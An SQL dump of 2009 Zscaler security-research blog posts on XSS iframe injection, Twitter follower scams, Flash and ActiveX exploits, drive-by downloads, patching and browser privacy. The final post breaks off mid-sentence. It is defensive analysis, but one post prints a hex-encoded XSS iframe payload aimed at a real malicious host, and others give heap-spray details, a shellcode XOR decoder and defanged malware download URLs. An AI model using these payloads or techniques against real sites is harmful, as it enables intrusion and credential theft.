INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (567, 'XSS Embedded IFrames', 'ThreatLabz', 'December 14, 2009', 'Today we saw a variety of pages being advertised that have search.htm and other pages vulnerable to cross-site scripting (XSS) being used to inject an iframe to a malicious webpage redirector. To an unknowing user following such an advertisement, they would believe that they were just visiting the intended host site unaware that the iframe was also redirecting them to malicious content.    Here are a few examples with some of the malicious XSS advertisements (do not follow these or other \"hxxp\" URLs below):      In each of the above examples, the parameter passed to the server\'s .htm or .php file is a string that includes encoded HTML. When the server processes the parameter, it displays the original parameter (users usually want to see their query string) and its results. Because the original parameter is displayed on the page without any sanitization for this type of encoded HTML, it is possible for this XSS to take place. The encoded HTML in each case is hexadecimal encoded HTML:    %3C%2F%74%69%74%6C%65%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%2F%2F%61%73%6B%35%2E%65%75%3E    which decodes to a closing </title> tag for the query string, followed by the malicious iframe to embed:    <iframe src=\"//ask5.eu\">    ask5.eu does a Javascript redirect using parent.location.replace() to:  hxxp://alanhui.co.cc    which does a Javascript parent.location.replace() to:  hxxp://max-well2.cn/?pid=349s01&sid=dd93d9    which lands the user at:  hxxp://windows-antivirus4.com/scan1/?pid=349s1&engine=%3DHW39TjuMDQxLjYyLjEyMyZ0aW1lPTEyNjI4NUEOOAkO    and downloads:  hxxp://windows-antivirus4.com/download/Inst_349s1.exe        Fake AV malware sample:  MD5: c0d2017be29e5383b1a680ef59ed22e0  Virus Total (6/41): http://www.virustotal.com/analisis/d1a052f117f1e0e4f828c04b7cabd8428cde6b9fc11f61e6e2f3d63ec01f9152-1260851264', 'Abuse', 'https://www.zscaler.com/blogs/research/xss-embedded-iframes');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (568, 'Twitter Follower Scams', 'Michael Sutton', 'November 23, 2009', 'Introduction\r\nIt\'s cool to be on Twitter but it\'s cooler still to have more followers than your neighbor. Some are so desperate to move into the lead that they\'re pulling out their credit card to get there. Those gullible enough to participate in the growing number of Twitter Follower scams are sure to be disappointed.\r\n\r\nScammers are setting up websites promising to provide Twitter followers to anyone willing to sign up. There are typically two levels of membership - basic and VIP. A basic membership offers followers in exchange for the right to \"use your account to promote [their] services\". Effectively, you are handing over your Twitter username and password to a third party that will then leverage your account to promote their service. In return, you are promised Twitter followers. In our tests, we received no followers but were signed up to follow a couple of hundred accounts that were presumably either fake accounts setup by the service or other victims. How do they make money? In part through advertising on their webpage but primarily by convincing individuals to become VIP members. To become a VIP member, you must either recruit others to sign up for the service or pay for the privilege. VIP membership comes with the promise of \"100-400 [new followers] each day\". If you choose to take the recruitment route, when initially signing up, you are provided with a unique URL that is to be given to others for signup. This will supposedly allow the service to keep track of your recruits and promote you to VIP status free of charge after 15 additional accounts are recruited. We attempted to promote our test accounts to VIP status this way; however, the domain name in the URL provided did not resolve and the request would therefore fail. Effectively, this leaves paying a monetary fee as the only option to achieve VIP status.\r\n\r\nThe Scam\r\nPromotion\r\nTweets sent from the accounts of past victims promote one of the many websites driving the scams. The URL is always obfuscated using a URL shortener and numerous URL shortening services are leveraged\r\n\r\nCommon Tweets\r\nIf you want 400 followers a day use…\r\nIf you wantt 100 followers a day use…\r\nI got 100 followers using…\r\nI just got 400 followers using…\r\nto get 400 followers a day…\r\nIf you want to get alot of followers check out…\r\nHey I just got alot of followers using…\r\nI got 100 followers in a day using…\r\nGet 500 followers a day using…\r\nTHE BEST WAY TO GET MORE FOLLOWERS…\r\nOUR GOAL IS TO GET U MORE FOLLOWERS…\r\nThis site got me 200 followers quick…\r\nWant FREE VIP, 100 new followers instantly and 1,000 new followers next week?\r\nThe best way to get 100 followers faster is using\r\nHey I just got alot of followers using\r\n\r\nCommon sites\r\nhttp://followersquick.info/\r\nhttp://tweeterspeed.com/\r\nhttp://twittfollow.com/\r\nhttp://followquick.info/\r\nhttp://tweeterleaders.info/\r\nhttp://twittfollow.info/\r\nhttp://wannafollowme.com/\r\nhttp://twtfast.info/\r\nhttp://twitter-builder.com/\r\n\r\nWhois information and IP address lookups suggest that at least some of the aforementioned websites are run by the same individuals. A number of the sites resolve to a single web hosting company in Malasiya and use the WhoisGuard service to hide registration information for the domains in question.\r\n\r\nPropagation\r\nWhen a user visits the site and enters their Twitter name and password, they have effectively handed over control of their Twitter account to a third party. The scammers will then use that account to futher promote the service. The user may receive a handful of followers but in our experience, they are simply fake accounts set up by the scammers themselves, if any followers are received at all. One of our favorite touches…the \'I agree with the rules\' checkbox on the signup page, can\'t be unchecked.\r\n\r\nRevenue\r\nVIP membership comes with the promise of \"100-400 [new followers] each day\". It can supposedly be obtained by either recruiting others to sign up for the service or by paying anywhere from $20 to $1,500, depending upon the duration of your VIP status (4 days to one year). Most scams leverage PayPal to complete the transaction. While it’s unclear how many people are actually pulling out their credit card to participate, the volume of Twitter accounts seen that have apparently signed up for the service, along with the number of scams emerging, suggest that the scam is successful.\r\n\r\nSadly, the scammers are actually rather straight forward about what they\'re doing, if only victims were to take the time to review the \'rules\':\r\n\r\n\r\n	You have to add all vip users and 20 regular users to join the train.\r\n	We may use your account to promote our services, with the exception of VIP account.\r\n	The fee for VIP is non-refundable.\r\n	After payment, give us up to 6 hours to update your VIP status.\r\n\r\n\r\nHow Successful is the Scam?\r\nSearching for either the phrases used to promote the sites, or the shortened URLs themselves shows that thousands of people are signing up for the services every day in the hopes that it will increase their number of Twitter followers. The screenshot below indicates that for only one of the sites, hundreds or Tweets Per Hour (TPH) are appearing in the Twitter live feed. What\'s not clear is how many people are taking the additional step of sending money to become VIP members.\r\n\r\nTwitter\'s Response\r\nWhat is Twitter doing about the scams? Nothing. Thousands of tweets promote the scam sites every day and they aren\'t hard to find. Twitter could easily be implementing filters to identify common phrases or URLs. Beyond this, common phishing blacklists such as PhishTank.org and Google’s SafeBrowsing, are largely ignoring such sites as well.\r\n\r\nConclusion\r\nThese sites are scams, plain and simple. In our experience, signing up for the service will ensure that your account is used to send out Twitter spam to promote the service and follow hundreds of other accounts but result in no meaningful additional followers. We chose not to pay for the VIP service but even if followers are added, they will simply be other victims or fake accounts created by those running the scam. If simply building up the number of followers on your Twitter account is of that much importance, regardless of who they are, take the time to create a bunch of fake Twitter accounts on your own – it’s free. If you have signed up for such a service in the past, we recommend changing your Twitter password immediately to ensure that the service can no longer post messages on your behalf. Your account could be used to post content that you don’t approve of and if so, good luck explaining why you shared your Twitter credentials.', 'Scam', 'https://www.zscaler.com/blogs/research/twitter-follower-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (569, 'In The Wild Flash Exploit Analysis – Part 2', 'ThreatLabz', 'September 18, 2009', 'In the first blog, we talked about how a recent Flash exploit works using heap spraying. In this blog, we will see how the shellcode functions and how it downloads malicious binaries to an infected system. If you remember, malicious shellcode was loaded on heap by the exploit. So let’s try to see if we can identify strings or URLs in the loaded shellcode. If you look closely, the shellcode is not in a readable format and appears to be encoded. Here is the how shellcode looks:        There is no single identifiable string in the shellcode. Let’s debug this shellcode further to understand if it is encoded or not. When we left off in the last blog, we were at a “CALL EAX” instruction with EAX pointing to 08080808. If we press F9, we will land on the heap and start executing every NOP instruction until ultimately reaching the malicious shellcode. We will reach the first instruction of the shellcode by putting a hardware breakpoint in the shellcode. Here is another screenshot of the debugger:        The shellcode contains some unused instructions and it will be difficult to understand it simply using static analysis. Let’s start debugging step by step. The first few instructions are the same and will POP EAX from stack. Then there is short jump call to 08089C42, which will call the address 08089C32. At which point it will XOR the ECX value and push a value of 3B8 (decimal 952) into CX. Then there is small loop, which is very interesting.    08089C3A 80340B BD XOR BYTE PTR DS:[EBX+ECX],0BD    08089C3E ^E2 FA LOOPD SHORT 08089C3A    The first instruction is XORing every byte with 0BD from the last byte i.e. starting from value (EBX+ECX) until the current EBX value as ECX will start decrementing. This is the method used to encode the original shellcode. After exiting from the loop, we land into decoded shellcode which can now be reviewed. Here is the XOR’ed version of original shellcode:        Gr8! Every instruction is now readable and easy to understand. We can now attempt to identify strings. I went into a memory dump of the heap and converted instructions into Hex/ASCII format. Here, I was able to find some known strings and one URL at the end. Here is the ASCII dump:        Now, this looks pretty straightforward. The above decoded shellcode is going to download “css.exe” to the infected system. At this point, I downloaded the malicious file. Let’s open it in OllyDbg and try to find some additional strings and to see what that executable is doing. I quickly looked at the disassembly and was able to quickly realize what the file is doing. I found an additional URL request in the code:        This executable downloads additional malware by visiting “hxxp://www.ffxiname.com”. Then it will add some registry values and run library “C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\300056251037don.dll,Set1” using \"C:\\WINNT\\System32\\rundll32.exe”. The TEMP directory will be full of additional malicious executables and DLL’s. The website in question (“ffxiname.com”) appears to be a drop zone, containing numerous additional exploits. The site will deliver different exploits based on the browser issuing the request. Here are some wireshark packet captures from the website:                The site is exploiting browser specific vulnerabilities to push additional malware. This is not the end of this process. It also downloads,    hxxp://www.40sys40.cn/txt/a1.exe    hxxp://www.40sys40.cn/txt/a2.exe    hxxp://www.40sys40.cn/txt/a3.exe    hxxp://www.40sys40.cn/txt/a4.exe    Additionally, two DLL’s are downloaded into the temp folder. The names of the files are “231053kou.dll” and “231054eve.dll”. Based on strings identified in the DLLs, it appears that they are used to sniff passwords for various web domains as can be seen in the following screen capture:             As can be seen, the initial infection due to the Flash vulnerability is only the start of the process. Successful exploitation leads to additional malicious binaries being downloaded to the infected system. The exploit also led to the installation of malicious DLL’s, which steal valuable information such as login credentials when you visit popular web sites.    That’s it for this series. Remember, this chain of infection was triggered when a victim with a vulnerable Flash Player simply viewed a single malicious page – no user intervention was required. This also shows that how active Flash exploits are in the wild. Keep your systems/AV up to date and install latest Flash Player from Adobe.    Be Safe,    Umesh', 'Exploit', 'https://www.zscaler.com/blogs/research/wild-flash-exploit-analysis-part-2');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (570, 'In The Wild Flash Exploit Analysis – Part 1', 'ThreatLabz', 'September 10, 2009', 'Today, one of my colleagues requested that I provide additional details about a web page that we had blocked for a customer. The blocked URL was ‘hxxp://www.39sys39.cn/htm/ie.html’. He wanted details about the threat present on the page. I downloaded the page and found out that it contained obfuscated JavaScript with heap spray code. I also found that the exploit contained an tag with a source file called “xp.swf”. At first glance, it was clear that the page is trying to exploit a Flash vulnerability. The exploit code is shown below:        The above exploit employed simple obfuscation to evade signature engines. If we decode the above script, we find the following:        It is also spraying the heap on an address of “0x08080808”. Shortly, we will learn why this address is needed to exploit the vulnerability. I downloaded both the “ie.html” and “xp.swf” files for further analysis. I also uploaded the “xp.swf” file to Virustotal to see if it was a known exploit or perhaps zero day content. Only 9 out of 41 antivirus engines detected the file as a virus. Those that did, identified the file as an exploit attacking CVE-2009-1862. This is a recent vulnerability, for which exploit code is currently in the wild, affecting Adobe Reader and Adobe Flash player. To check if the exploit was working properly, I replaced the shellcode in the exploit with simple shellcode that will execute “calc.exe”. I opened this file with both Firefox and Internet Explorer and here is what happened,        The JavaScript code successfully exploited the known vulnerability in Flash and executed our replacement shellcode to open “calc.exe”. This demonstrates just how dangerous the vulnerability is as it requires a victim to simply visit a malicious page containing the Flash exploit. No further user intervention is required. In this case, I had replaced the original shellcode for testing and the exploit opened calculator successfully. Next, I wanted to determine the purpose of the original shellcode, so I then modified the original exploit code to force a crash in order to debug further. I ran the file again, this time with Internet Explorer and received the following popup message:        The referenced memory address in the above figure is “0x08214408. The program is unable to read data from an invalid address, which led to a crash. Now if you remember, the original exploit in the first image of the blog uses the “0x08080808” memory address to spray the heap with shellcode. Bingo! This means the program is crashing may be due to memory corruption. That is why the exploit must spray the heap with an address of “0x08080808”. I then clicked on cancel button to debug further. I wanted to find which instruction actually reads the data and calls the shellcode. Here is the first state of the OllyDbg debugger:             Look at the above instructions. The register EDX is trying to read a value from ESI which points to invalid address 08214408. Let’s analyze the instructions that follow.    MOV EDX,DWORD PTR DS:[ESI]    MOV EAX,DWORD PTR DS:[EDX+44]    PUSH EBP    MOV ECX,ESI    CALL EAX    TEST AL,AL    Let’s assume [ESI] contains some value which is moved to EDX. Then EAX will contain the value [EDX+44]. Then the program will push EBP on the stack, move the ESI address to ECX and look at the next instruction “CALL EAX”. This is where a call has been made to execute the shellcode. We can conclude that if we spray the heap with 08080808 and shellcode, [ESI] will contain 08080808, which will be moved to EDX. EAX will also contain 08080808 which will be called after the “MOV ECX, ESI” command. Then this call will jump to heap memory at an address of 0x08080808 and execute the shellcode. Let’s see if that holds true.        This time I reopened the original exploit in the Firefox, put a breakpoint at the above-mentioned instructions and sure enough, we were right. EAX now points to 08080808 and the heap is sprayed with 08 bytes and shellcode. If I press “F9” to continue, it will jump onto the heap area and will execute the instruction found. The instruction 0808 is effectively a NOP sled. It is simply “OR BYTE PTR DS:[EAX],CL” which will do nothing as CL contains 08. It will reach the shellcode by executing 0808 instructions and ultimately execute the malicious code.    This means some field/value from the malicious Flash file is causing memory corruption. Here is the how original shellcode is loaded into memory,        This is just overview of how this exploit works. In the next part we will see what original shellcode does. Specifically, we will identify the additional content downloaded to the victim’s machine.    This exploit proves that flash exploits can be very dangerous. Such exploits do not require user intervention. Simply by visiting a malicious web page, the victim will be exploited.    That’s for part 1 now. Do come back for part 2 of this blog.    Umesh', 'Exploit', 'https://www.zscaler.com/blogs/research/wild-flash-exploit-analysis-part-1');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (571, 'Watered Down Phishing Protection In IPhone OS 3.X?', 'Michael Sutton', 'September 09, 2009', '[Update: 09-13-09 @ 5:43pm EST - Looks like we may have finally resolved this. Apple has apparently issued a statement indicating the the anti-phishing filter doesn\'t take affect until the blacklist is downloaded which only occurs while the phone is charging. According to the statement, users should \"launch Safari, connect to a Wi-Fi network and charge their iPhone with the screen off\". Certainly a bit odd, but at least the functionality seems to be working after all.]         [Update: 09-11-09 @ 4:27pm EST - It would appear that the wrinkles have largely been ironed out. In a random sample of 50 pages blocked by Safari for OS X, only one was not blocked by Safari for iPhone OS 3.1. So what happened?    1.) Sites not blocked on 09-09-09, were blocked 24 hours later    2.) People have been seeing inconsistent results, whereby the same pages would be blocked by one phone and not another    Based on what we\'ve seen, it seems likely that the issue was not with the blocking feature itself within iPhone OS 3.1, but rather the updates being pushed to iPhones. At the time of the iPhone OS 3.1 deployment, some phones were not receiving updates while others were.]         [Update: 09-10-09 @ 2:39pm EST - Today, we\'re seeing inconsistent results. Sites that were yesterday confirmed not to be blocked by Mobile Safari (iPhone OS 3.1), despite being block by Safari in OS X, are now being blocked yet others are not. For example, http://kingsofaldora.atspace.com/ is now being blocked (wasn\'t yesterday) and http://1001porngalleries.com/ is still not being blocked on the iPhone, despite being blocked by Safari for OS X. We\'ll need to hear from Apple to know for sure but I suspect that the failed blocking is related to phishing updates not being delivered to the iPhone as opposed to as issue with the functionality itself.]    I\'ve complained in the past that mobile browser vendors have not learned from past mistakes. Despite the fact that functionality such as phishing and malicious URL black lists are now common place in mobile web browsers, their mobile counterparts have virtually no security controls whatsoever. I was encouraged when Apple announced anti-phishing protection with the release of iPhone OS 3.0.                    iPhone OS 3.0 was released on June 17, 2009 - three months ago. Despite that fact, I don\'t recall ever having received a phishing block message on the iPhone. Today, Apple released iPhone OS 3.1 and once again specifically called out phishing protection. In fact, within the Safari settings, there is now a Security section with a Fraud Warning option. By selecting this option, which is on by default, you will be \"warn[ed] when visiting fraudulent websites\". Sounds great. The problem? It doesn\'t work.         Apple\'s Safari web browser, leverages Google\'s SafeBrowsing initiative to block both malicious URLs and phishing sites. Not so for mobile Safari on the iPhone. Apple has only chosen to only target phishing sites on the iPhone. While Apple would likely argue that malicious content on web sites target browser specific vulnerabilities, that\'s not much of an argument. Attacks that I refer to as naked browser attacks such as cross-site scripting (XSS), cross-site request forgery (CSRF) and Clickjacking don\'t discriminate - they impact all browsers equally. Moreover, past Apple vulnerabilities suggest that there is no shortage of code sharing between the iPhone OS and OS X. After all, the initial iPhone jailbreaks leveraged a known vulnerable TIFF rendering library.         Beyond this, the phishing protection on the iPhone is ineffective. I\'ve tested a variety of online/validated phishing sites from PhishTank. They were generally blocked by Safari, but none were blocked by Safari Mobile. In fact, I have yet to identify a single phishing page blocked on the iPhone. What\'s clear here is that the functionality for the iPhone is not equivalent to what is being employed by OS X. Why? Apple touts Mobile Safari as the killer app that finally makes surfing the web on a mobile device a realistic proposition and the numbers back up that claim. Surely I can be phished on the iPhone just as I can fall victim browsing the web on my laptop.         If you identify phishing sites blocked by the iPhone OS 3.1 software, please post the link to the blog comments. If you work for Apple, please comment on why you went with watered down phishing protection on the iPhone.         - michael', 'Apple', 'https://www.zscaler.com/blogs/research/watered-down-phishing-protection-iphone-os-3x');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (572, 'Cloud Transparency During A Crisis', 'ThreatLabz', 'July 07, 2009', 'The beginning of July was a big week for data center outages with some notable Internet impact. I\'ve written before about cloud resiliency and uptime in my \'Changing a tire while going 60mph\' and \'Big, white puffy clouds can still evaporate\' posts.Amongst those outages was a Google App Engine interruption, which just goes onto the tally sheet as yet another failure of a supposed infallible cloud platform service. Ted Dziuba has some interesting viewpoints on the App Engine outage, and brings up a key element that makes all the difference with these types of outages: transparency. If something fails, people like to know why it happened (especially in light of all the resiliency/redundancy claims of the cloud) and what is being done so it doesn\'t happen again. Google\'s transparency was a basic statement that something bad happened with GFS, and that affected BigTable, which affected App Engine\'s DataStore, and they are going to fix it. Now, compare that level of detail to the information offered by Amazon during their S3 outage from July 2008 and February 2008. There is a notable difference. So a message to SaaS vendors: just because customers don\'t need to know the platform and implementation details behind your SaaS, doesn\'t mean they don\'t want to know...especially in light of a catastrophic failure. Telling customers what went wrong let\'s them enact their own post-mortem and due-diligence analysis processes to ensure they haven\'t shackled themselves to a SaaS vendor who is experiencing outages due to silly oversights that are likely to repeat as life goes on.Actually, transparency and efficient communication regarding the outage event was also a key issue for some of the other outages last week. Jeremy Irish blogged about the fire at Fisher Plaza data center that left his systems offline for 29 hours. Apparently news of what exactly was happening, even for the first responders that were physically present at the building, was scarce and little effort was made to keep folks efficiently informed. Eventually they found out that it was a fire in a basement-level electrical room, which triggered the sprinklers and in turn ruined additional electrical equipment and generators, which ultimately caused significant damage to the power infrastructure.Overall, Murphy and his laws are a fact of life and vendors (cloud, SaaS, or other) must do what is in their power to have contingency plans if you truly want to maintain availability and business continuity. And SaaS vendors, take note: just because you can hide the implementation and platform details of your service, doesn\'t mean you should hide the operational details of your service...especially during a service disruption.Until next time,- Jeff', 'Cloud', 'https://www.zscaler.com/blogs/research/cloud-transparency-during-crisis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (573, 'Patches, Auto-updating, And Convenience', 'ThreatLabz', 'June 15, 2009', 'June has been a busy month for web-centric security patches. Microsoft fixed 31 different vulnerabilities (many affecting IE and Office), Adobe patches critical vulnerabilities in Adobe Acrobat and QuickTime, Google plugged some WebKit holes in Chrome, Apple released over 50 security fixes for Safari, and Firefox had 11 security vulnerabilities fixed, half of which were rated critical. With a lineup like this, a majority of the world is going to need to install patches to keep safe.\r\n\r\nDespite the patches being available, history has shown that people don\'t always install them. Installing patches is an inconvenience; it interrupts the use of the system and potentially requires reboots. In enterprise environments, all of this can be semi-automated with patch management and deployment systems, centralized patch repositories like WSUS, and policies that dictate the employee just sit tight while mandatory patches are applied. But for home users, computer use is often casual--which means convenience has a very strong influence. If they get on the computer to check email or surf MySpace, they are likely to not want to postpone those computing desires in order to deal with installing patches first. That\'s assuming they even know about the availability of patches in the first place.\r\n\r\nRecently some folks from Google and their partners released an analysis of web browser auto-update approaches. The analysis looked at the different effectiveness of how quickly patches gained widespread deployment due to the different patching processes they offer. For example, Chrome does \"silent updates\"--it will download patches/new versions and automatically install them without telling you. Firefox will automatically download updates, but then you have to still manually agree to the installation via a prompt given to you by Firefox. Safari tells you that an update is available, but then you have to manually agree to download and then install the update. Opera will inform you of a new version, but then you have to manually download the update yourself and proceed through the install wizard. Internet Explorer relies on Windows Automatic Update agent to download and install patches.\r\n\r\nOverall, the Google analysis found that Chrome’s silent update approach resulted in the widest spread of update deployment (97% of systems patched/updated) within a fixed period (three weeks). Firefox wound up with 85% of systems patched/updated after three weeks, and Safari and Opera wound up with some pretty low numbers. The conclusion? Badgering the user to be involved in the update process causes them to interrupt, abort, or ignore the process, leaving the patches/updates unapplied. That is non-ideal when security is involved.\r\n\r\nBut just because there are auto-update mechanisms available (Chrome, Windows), doesn\'t solve the problem per se. I\'ve encountered situations on numerous occasions where the user has disabled the automatic updating process because the software they were using was, well, \"borrowed.\" Microsoft has been struggling with this issue for years now: whether to allowed pirated copies of Windows to be eligible for service pack updates and other patches. They have slipped various anti-piracy checks into their update process under the moniker Windows Genuine Advantage, which means only legitimate copies of Windows have access to the collection of updates. But even if the software vendor doesn\'t implement technical restrictions to prevent pirated versions from updates, the user\'s conscience might still prevent it. A person who \"borrows\" a commercial software application from their friend is less likely to run to the vendor asking for support and updates, because they do not want to get their friend in trouble for handing out pirated copies; so such people are more likely to disable anything that automatically alerts the vendor to the second copy, and/or will ignore any updates (where they might be asked how they got the software in the first place) and just stick with the original (now outdated and insecure) version.\r\n\r\nOverall this whole timely security patching business is a tough problem to solve, because it\'s not simply just a matter of expecting users to download an installation file off a website and double-clicking it.\r\n\r\nUntil next time,\r\n- Jeff', 'Vulnerability', 'https://www.zscaler.com/blogs/research/patches-auto-updating-and-convenience');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (574, 'Page Is Loading… Please Wait', 'ThreatLabz', 'June 07, 2009', 'Web access is a critical activity for virtually all jobs, but how many employees recognize the risks that can be encountered simply by viewing a web page? How many times have you encountered web pages with a title such as “Page is loading… Please wait”? I’ve already talked about the threats posed by Phishing and ActiveX vulnerabilities in previous blogs. Another significant threat on the web is the increasingly popular drive-by download attack. In this attack, malicious software is downloaded without user knowledge by exploiting known/unknown web browser or opreating system vulnerabilities. Recently, we came across an interesting website hosting malicious animated page. The page shows animation that will entice the victim to wait patiently while content is supposedly being loaded on the page. Below is a screen capture of the page in question.               When someone visits this web page, it will continually play the ‘page is loading…’ animation and nothing will ever be displayed on the page. The victim will undoubtedly grow impatient and eventually close the page and continue surfing. But wait; did the victim notice what else was being loaded? Of course not as the malicious content was loaded in the background. Yes, the page actually contains a couple of malicious iframes,               Looking at the above code, there are two hidden malicious iframes, one is clearly shown in text format and other is obfuscated. Those hidden iframes actually point to malicious websites hosting the “LuckySploit” attack toolkit. This is another type of exploit toolkit, which takes the advantage of different types of critical vulnerabilities to download additional malware. This toolkit is more advanced than the older Mpack, Icepack, etc. toolkits. Finjan’s blog has provided detail on this new attack toolkit. After visiting the above page, the malicious website sends obfuscated JavaScript which exploits vulnerabilities, if present and downloads additional malicious binaries. The packet capture for obfuscated JavaScript is shown below,                    The attacker has done his job behind the page by downloading malicious binaries without the user noticing. These attack toolkits spread by injecting malicious hidden iframes into otherwise legitimate sites. Once the victim visits those sites, they are redirected to attacker’s website. Social engineering can also be employed to convince victims to directly visit malicious sites controlled by the attakers. The frightening part of these attacks is that the victim does not have to do anything. They simply visit the malicious page and everything runs in the background. Such malicious sites are increasing every day with advanced techniques and with the help of different novel ways to spread malware. Browser patch management is critical for those enterprises seeking to defend against such attacks.    We have observed that number of websites that are infected by hidden malicious iframes and the latest ones include attacks carried out LuckySploit and Gumblar. We recommend you to keep your antivirus updated and keep your eye on such suspicious websites while surfing.    Happy surfing!!!    Umesh', 'Exploit', 'https://www.zscaler.com/blogs/research/page-loading-please-wait');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (575, 'ActiveX Vulnerabilities – Threat To Web Security', 'ThreatLabz', 'May 18, 2009', 'As I mentioned in my earlier blog, phishing is a never-ending threat for web security. Another threat for web users is the rise in the ActiveX vulnerabilities. These are very easy to exploit as there is a great deal of information available including vulnerability details, proof-of-concept exploits, etc. freely available on the Internet. ActiveX controls can be automatically downloaded and executed by Internet Explorer (with user acceptance) when viewing a web page or installed as part of a larger application. Basically, ActiveX controls have various properties and methods, which can lead to exploitation if they have not been properly coded. If someone were to find a vulnerable property or method in an ActiveX control, it is not be difficult to create a working exploit and host it on a web server. If the vulnerable control is marked ‘safe for scripting’ it can then be remotely called and exploited by a malicious web site.    Numerous buffer overflows and file overwrite vulnerabilities have been found in ActiveX controls over the past few years and working exploits are available for many of them. Using a heap spray technique, which is a popular method for reliably injecting shell code into memory, the vulnerable control can be successfully exploited by the attacker. He simply needs to host the working exploit somewhere on a web server under his control and divert a victim to visit the site. If the vulnerable ActiveX control is present on the victim’s machine, the victim will be compromised silently in the background and the vulnerability could allow remote code execution or arbitrary file overwrite. The attacker could then download and install additional malware or malicious programs.    A few months back, a vulnerability was found in Snapshot Viewer for Microsoft Access (MS08-041) that can be leveraged to download and save files to arbitrary locations on an affected system. As noted in a Symantec blog post, because this particular ActiveX control was signed by Microsoft, attackers were able to force installation/exploitation of the control without any user interaction. Web attacking toolkits like Mpack, Neospolit, etc. found in the wild are exploiting a number of such critical ActiveX vulnerabilities.    Due to the ease of exploitation with vulnerable ActiveX controls, attackers are widely using them as a popular attack vector. Heap spray code is very easy to work with and can be seen in many attacks involving ActiveX exploits. This gives the attacker the power to easily change the shellcode to whatever is required. He can then host the exploit code on the webpage and convince victims to visit the Web site, typically by getting them to click a link in an HTML e-mail link. ActiveX vulnerabilities are rising every day and people are posting exploit code on public web sites. A quick search on Securityfocus will reveal the latest ActiveX vulnerabilities as shown below:               Gone are the days when attackers were targeting server side vulnerabilities to compromise systems. Now, they are focused on targeting end users, via the web browser. A combination of heap spray and obfuscation used in the exploits makes it difficult to detect the attacks using automated means. Certainly, the rise in the use of ActiveX vulnerabilities and exploits posted on the web makes them a real threat for web security. Setting up a kill bit is the only option if the vulnerability is not patched and you do not have updated antivirus signatures. The Kill-Bit is a registry key for a particular CLSID that marks the COM object / ActiveX control referenced by that CLSID as non-loadable in the browser and other scriptable environments. Setting a Kill-Bit for the control marks that particular control as forbidden to instantiate in the browser. You can do this by modifying the data value of the Compatibility Flags DWORD value for the CLSID of the ActiveX control. Here is the link from Microsoft on how to set a kill bit for a given control:    http://support.microsoft.com/kb/240797    That’s it for now.    Umesh', 'Vulnerability', 'https://www.zscaler.com/blogs/research/activex-vulnerabilities-threat-web-security');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (576, 'Those Who Know Where And When You Surf', 'ThreatLabz', 'May 15, 2009', 'Nobody likes the idea of a big brother watching over them as they surf. Yet as browser technology evolves, we are starting to have some privacy-violating \"byproducts\" of innocuous features. Now, we already generally accept that our immediate/upstream Internet providers can possibly snoop on our traffic—they can see what sites we try to access (whether by IP destination or monitoring DNS queries) and can peek into plaintext content. But the ability for an ISP to monitor traffic is limited to only the traffic that passes through it—namely, its customers. What if there were central organizations that could monitor user traffic (to a certain degree) across any/all ISPs?I\'m going to go ahead and overlook the obvious companies/services where you install a toolbar into your browser so they can watch and tabulate everywhere you go (like Alexa). That is an opt-in situation where you willingly give all your info to a third party. I\'m also going to overlook any web proxy services that you might be using, because those are also opt-in situations with the same ramifications. And of course, any internal monitoring within an organization is also exempt; I want to focus on who, outside of your local network, organization, and your ISP, is receiving your surfing data without you explicitly opting-in to give it to them.So let\'s start with HTTPS, as implemented in common web browsers. Most common browsers include certificate revocation checking capabilities for ensuring an HTTPS site certificate hasn\'t been compromised. When you access an HTTPS site, the browser will receive the server certificate and run off the to the designated CRL and OCSP servers to query whether the certificate has been revoked. Those CRL and OCSP servers are operated by the certificate issuers, such as Thawte, Verisign, etc. The key here is that many SSL certificates have a one-to-one relationship with a specific web site (i.e. traditional certificates and not wildcard certificates); so a query to an OCSP responder for a web site certificate essentially tells the certificate issuer that you are in the process of accessing that site. Now, certificate issuers can only track accesses to sites they issue certificates for—but in 2007, Verisign and subsidiaries were deemed to have issued over 57% of the SSL certificates in use, giving them the theoretical capability to track site access to over half of the HTTPS sites on the Internet.Fortunately none of the OCSP responders I briefly reviewed set HTTP browser cookies, which means they are not tracking unique individuals (at least, not through simple browser means). That is a good thing; the best tracking granularity they can achieve is generally per source IP address (ignoring browser header/request and TCP protocol fingerprinting to differentiate different browsers/systems from the same IP). This can be problematic if you\'re a home user and have a one-to-one relationship with your IP address, but tolerable if you\'re behind a NAT or proxy that serves many users (giving it a many-to-one relationship with the IP address). [Aside/favor: If you happen to see a public OCSP setting browser cookies, let me know!]Default browser start pages are another privacy leaking avenue. Every time you start your web browser, Microsoft, Apple, Opera, or Mozilla hears about it through the various default browser start page request(s):http://en-us.start2.mozilla.com/firefox?client=firefox-a&rls=org.mozilla:en-US:officialhttp://www.apple.com/startpage/http://portal.opera.comhttp://go.microsoft.com/fwlink/?LinkId=74005http://runonce.msn.com/runonce3.aspxThe start pages themselves may seem innocuous, but they can chain to more exposure. For example, Apple\'s start page includes a request to metrics.apple.com, which is really a pointer to Omniture (resolving metrics.apple.com returns a DNS CNAME to appleglobal.112.2o7.net); the request collects and sends a lot of identifying browser information including screen resolution and all installed browser plugins. I\'ve seen occasions where responses to metrics.apple.com forward to Doubleclick.net too. Now, sure, it\'s common for web pages to include metrics/analytics and advertising links—but such elements on browser start pages means these syndication/service providers also have access to realtime information of when you start your browser. In addition to Apple\'s use of Omniture and Doubleclick, Opera\'s portal page includes resource links to Google Analytics, and Mozilla redirects to Google. Microsoft\'s portal page used Webtrends.com for metrics.But more importantly, can any of these providers uniquely identify you? 